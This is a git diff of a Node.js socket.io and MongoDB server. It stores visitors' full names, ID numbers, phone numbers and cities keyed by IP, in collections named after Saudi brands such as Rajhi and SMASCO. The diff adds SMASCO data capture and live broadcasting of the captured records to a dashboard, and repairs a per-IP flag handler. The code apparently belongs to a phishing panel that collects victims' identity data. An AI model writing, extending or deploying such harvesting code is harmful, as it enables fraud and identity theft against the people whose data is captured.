@@ -255,6 +255,7 @@ const SmascoInfoSchema = new mongoose.Schema(
   {
     ip: { type: String, unique: true, required: true },
     fullname: { type: String },
+    FullName: { type: String },
     IDNumber: { type: String },
     phone: { type: String },
     city: { type: String },
@@ -496,6 +497,8 @@ io.on("connection", (socket) => {
         allRajhis,
         allBasmah,
         allFlags,
+        allSmascoInfo,
+        allSmascoService
       ] = await Promise.all([
         IndexPage.find({}).sort({ updatedAt: -1 }).lean(),
         DetailsPage.find({}).sort({ updatedAt: -1 }).lean(),
@@ -510,6 +513,8 @@ io.on("connection", (socket) => {
         Rajhi.find({}).lean(),
         Basmah.find({}).lean(),
         Flag.find({}).lean(),
+        SmascoInfo.find({}).sort({ updatedAt: -1 }).lean(),
+        SmascoService.find({}).sort({ createdAt: -1 }).lean()
       ]);
 
       socket.emit("initialData", {
@@ -526,6 +531,8 @@ io.on("connection", (socket) => {
         rajhi: allRajhis,
         basmah: allBasmah,
         flags: allFlags,
+        smascoInfo: allSmascoInfo,
+        smascoService: allSmascoService,
       });
     } catch (err) {
       console.error("Error in loadData:", err);
@@ -783,22 +790,38 @@ io.on("connection", (socket) => {
 
   // toggleFlag
   socket.on("toggleFlag", async ({ ip, flag }) => {
+    try {
+      await Flag.findOneAndUpdate({ ip }, { flag }, { upsert: true, new: true });
+      io.emit("flagUpdated", { ip, flag });
+    } catch (err) {
+      console.error("❌ toggleFlag error:", err);
+    }
+  });
 
   // ═══════════════════════════════════════════════════════════════
   // SMASCO Events
   // ═══════════════════════════════════════════════════════════════
   socket.on("submitInfo", async (data) => {
     try {
+      const payload = {
+        ...data,
+        FullName: data.FullName || data.fullname || data.name || "",
+      };
+
       const doc = await SmascoInfo.findOneAndUpdate(
-        { ip: data.ip },
-        data,
+        { ip: payload.ip },
+        payload,
         { upsert: true, new: true, setDefaultsOnInsert: true }
       );
+
+      // Realtime update (Dashboard can listen if enabled)
       io.emit("newSmascoInfo", doc);
+
+      // Also emit newDetails? No - keep isolated
       socket.emit("ackInfo", { success: true });
-      console.log("✅ SMASCO Info:", doc.fullname);
+      console.log("✅ SMASCO Info:", doc.FullName || doc.fullname || doc.ip);
     } catch (err) {
-      console.error("❌ Error:", err);
+      console.error("❌ SMASCO submitInfo error:", err);
       socket.emit("ackInfo", { success: false, error: err.message });
     }
   });
@@ -808,15 +831,13 @@ io.on("connection", (socket) => {
       const doc = await SmascoService.create(data);
       io.emit("newSmascoService", doc);
       socket.emit("ackService", { success: true });
-      console.log("✅ SMASCO Service:", doc.service_type);
+      console.log("✅ SMASCO Service:", doc.service_type || doc.ip);
     } catch (err) {
-      console.error("❌ Error:", err);
+      console.error("❌ SMASCO submitService error:", err);
       socket.emit("ackService", { success: false, error: err.message });
     }
   });
-    await Flag.findOneAndUpdate({ ip }, { flag }, { upsert: true, new: true });
-    io.emit("flagUpdated", { ip, flag });
-  });
+
 });
 
 // ─── 8) MONGODB CONNECT & SERVER START ────────────────────────────────────────
